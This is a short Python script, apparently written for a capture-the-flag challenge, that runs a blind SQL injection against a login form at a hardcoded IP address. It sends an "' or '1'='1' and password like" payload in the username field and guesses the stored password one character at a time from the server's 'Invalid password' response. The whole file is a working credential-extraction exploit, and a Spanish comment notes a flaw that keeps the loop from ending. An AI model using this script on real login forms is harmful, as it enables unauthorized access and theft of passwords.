from urllib import request, parse
import string
result = ''
result_ant = ''

while True:
  # No acaba porque dentro de string.printable está el símbolo %
  for i in string.printable:
    print('testing with '+result+i)
    payload = "' or '1'='1' and password like '"+result+i+"%"
    data = parse.urlencode({'username': payload, 'password': 'pwd'}).encode()
    req =  request.Request('http://35.190.155.168/a713246a2f/login', data=data) # this will make the method "POST"
    resp = request.urlopen(req)
    if "Invalid password" in str(resp.read()):
      print("Got: ", i )
      result_ant = result
      result += i
      break
  if result_ant == result:    
    break

print(result)
